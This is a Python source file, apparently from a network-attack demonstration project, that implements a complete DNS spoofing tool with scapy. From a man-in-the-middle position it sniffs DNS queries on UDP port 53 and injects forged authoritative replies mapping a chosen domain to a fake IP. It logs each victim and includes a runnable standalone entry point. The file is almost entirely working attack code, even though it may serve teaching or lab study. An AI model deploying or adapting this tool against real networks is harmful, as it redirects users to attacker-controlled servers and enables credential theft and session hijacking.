"""
src/attacks/dns_spoofing.py

DNS Spoofing Attack

This module demonstrates how an attacker in a Man-in-the-Middle (MITM) position
can forge DNS responses to redirect a victim to an attacker-controlled IP.

Properties:
- Exploits the lack of authentication in classic DNS (UDP-based)
- Relies on speed: attacker replies before the legitimate DNS server
- Enables higher-level attacks (SSL stripping, credential theft, session hijacking)

This module assumes ARP spoofing is already active.
"""

import threading
import time
from datetime import datetime
from scapy.all import (
    sniff,
    sendp,
    Ether,
    IP,
    UDP,
    DNS,
    DNSQR,
    DNSRR,
)


class DnsSpoofingAttack(threading.Thread):
    """
    DNS spoofing via response injection.

    The attacker listens for DNS queries from the victim and immediately
    injects a forged DNS reply that maps a target domain to a fake IP.
    """

    def __init__(self, domain: str, fake_ip: str, interface: str = "enp0s3"):
        super().__init__()
        self.daemon = True

        self.domain = domain.strip(".")
        self.fake_ip = fake_ip
        self.interface = interface

        self._stop_event = threading.Event()

        # Audit / statistics
        self.start_time = None
        self.queries_seen = 0
        self.spoofs_sent = 0
        self.last_victim_ip = None

    # Logging helpers
    def _log(self, level: str, msg: str):
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[DNS] [{ts}] [{level}] {msg}")

    # Core attack logic
    def _dns_interceptor(self, packet):
        """
        Intercepts DNS queries and injects spoofed responses.
        """
        if self._stop_event.is_set():
            return

        if not packet.haslayer(DNS) or not packet.haslayer(DNSQR):
            return

        dns = packet[DNS]

        # Only spoof standard queries (opcode 0) with no answers yet
        if dns.opcode != 0 or dns.ancount != 0:
            return

        queried_domain = packet[DNSQR].qname.decode(errors="ignore").strip(".")
        self.queries_seen += 1

        if queried_domain != self.domain:
            return

        victim_ip = packet[IP].src
        self.last_victim_ip = victim_ip

        self._log(
            "INFO",
            f"Intercepted DNS query from {victim_ip} for {queried_domain}"
        )

        # Craft forged DNS response
        spoofed_response = (
            Ether(src=packet[Ether].dst, dst=packet[Ether].src)
            / IP(src=packet[IP].dst, dst=packet[IP].src)
            / UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
            / DNS(
                id=dns.id,
                qr=1,
                aa=1,
                qd=dns.qd,
                an=DNSRR(
                    rrname=packet[DNSQR].qname,
                    ttl=30,
                    rdata=self.fake_ip,
                ),
            )
        )

        sendp(spoofed_response, iface=self.interface, verbose=False)
        self.spoofs_sent += 1

        self._log(
            "SUCCESS",
            f"Sent forged DNS reply: {queried_domain} → {self.fake_ip}"
        )

    # Thread lifecycle
    def run(self):
        self.start_time = time.time()

        self._log("INFO", "DNS Spoofing attack started")
        self._log(
            "INFO",
            f"Target domain: {self.domain} → fake IP: {self.fake_ip}"
        )
        self._log(
            "INFO",
            "Waiting for victim DNS queries (UDP/53)..."
        )

        sniff(
            iface=self.interface,
            filter="udp port 53",
            prn=self._dns_interceptor,
            store=0,
            stop_filter=lambda _: self._stop_event.is_set(),
        )

        self._log("INFO", "DNS Spoofing thread stopped")

    def stop(self):
        self._log("INFO", "Stopping DNS Spoofing attack...")
        self._stop_event.set()

        runtime = time.time() - self.start_time if self.start_time else 0
        self._log(
            "INFO",
            f"Summary: runtime={runtime:.1f}s, "
            f"queries_seen={self.queries_seen}, "
            f"spoofs_sent={self.spoofs_sent}"
        )

        if self.last_victim_ip:
            self._log(
                "INFO",
                f"Last victim affected: {self.last_victim_ip}"
            )



# Standalone testing
if __name__ == "__main__":
    print("Testing DNS spoofing (requires ARP spoofing + root)")
    print("Press Ctrl+C to stop.\n")

    attack = DnsSpoofingAttack(
        domain="example.com",
        fake_ip="1.2.3.4",
    )

    try:
        attack.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping...")
        attack.stop()
        attack.join()
